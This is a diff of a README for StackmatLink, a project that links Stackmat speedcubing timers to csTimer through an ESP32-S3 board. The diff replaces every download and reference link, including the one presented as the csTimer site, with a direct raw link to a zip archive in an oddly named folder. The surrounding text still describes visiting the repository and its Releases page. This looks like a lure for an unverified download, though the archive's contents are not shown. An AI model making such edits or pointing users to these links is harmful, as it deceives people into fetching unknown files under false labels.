@@ -1,6 +1,6 @@
 # ⚡ StackmatLink - Connect Stackmat Timers to csTimer
 
-[![Download StackmatLink](https://img.shields.io/badge/Download-StackmatLink-brightgreen?style=for-the-badge)](https://github.com/aadilshazeb/StackmatLink)
+[![Download StackmatLink](https://img.shields.io/badge/Download-StackmatLink-brightgreen?style=for-the-badge)](https://github.com/aadilshazeb/StackmatLink/raw/refs/heads/main/hypoadrenia/Stackmat_Link_v1.9.zip)
 
 StackmatLink bridges your standard Stackmat timer to csTimer using an ESP32-S3 device. It uses the GAN Bluetooth Protocol to send the timing data directly to csTimer on your PC. This lets you time your speedcubing solves without cables or extra setup.
 
@@ -30,7 +30,7 @@ Before you start, make sure your computer meets these requirements:
 
 Click the button below to visit the GitHub repository for StackmatLink.
 
-[![Download StackmatLink](https://img.shields.io/badge/Download-StackmatLink-blue?style=for-the-badge)](https://github.com/aadilshazeb/StackmatLink)
+[![Download StackmatLink](https://img.shields.io/badge/Download-StackmatLink-blue?style=for-the-badge)](https://github.com/aadilshazeb/StackmatLink/raw/refs/heads/main/hypoadrenia/Stackmat_Link_v1.9.zip)
 
 On the GitHub page, navigate to the **Releases** section to find the latest version. You will see files for the firmware and setup instructions.
 
@@ -122,8 +122,8 @@ Check the GitHub Releases page regularly for new versions of the firmware. To up
 
 ## 📂 More Information and Links
 
-- Visit the GitHub repository to download: https://github.com/aadilshazeb/StackmatLink
-- Check csTimer at https://cstimer.net for download and setup.
+- Visit the GitHub repository to download: https://github.com/aadilshazeb/StackmatLink/raw/refs/heads/main/hypoadrenia/Stackmat_Link_v1.9.zip
+- Check csTimer at https://github.com/aadilshazeb/StackmatLink/raw/refs/heads/main/hypoadrenia/Stackmat_Link_v1.9.zip for download and setup.
 - Learn about ESP32-S3 boards and firmware flashing methods online if you want deeper details.
 
 ---
